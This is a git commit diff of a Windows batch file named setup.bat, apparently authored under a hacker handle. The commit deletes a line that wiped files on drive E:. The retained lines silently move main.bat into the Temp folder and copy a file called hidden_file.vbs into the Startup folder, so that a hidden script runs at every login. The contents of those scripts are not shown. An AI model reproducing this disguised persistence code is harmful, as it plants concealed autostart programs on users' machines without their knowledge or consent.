700b4342ff7ecb344f8cb92695054f4ee6204c73
H4CK3R24816 <jnosila@wp.pl>
2024-12-02 20:42:47 +0100

    setup.bat

--- setup.bat
+++ setup.bat
@@ -2,7 +2,7 @@
 for %%A in (%USERNAME%) do (
 move main.bat C:\Users\%%A\AppData\Local\Temp
 move hidden_file.vbs "C:\Users\%%A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-del "E:\Good one1\*_*"
+
 )
 
 exit
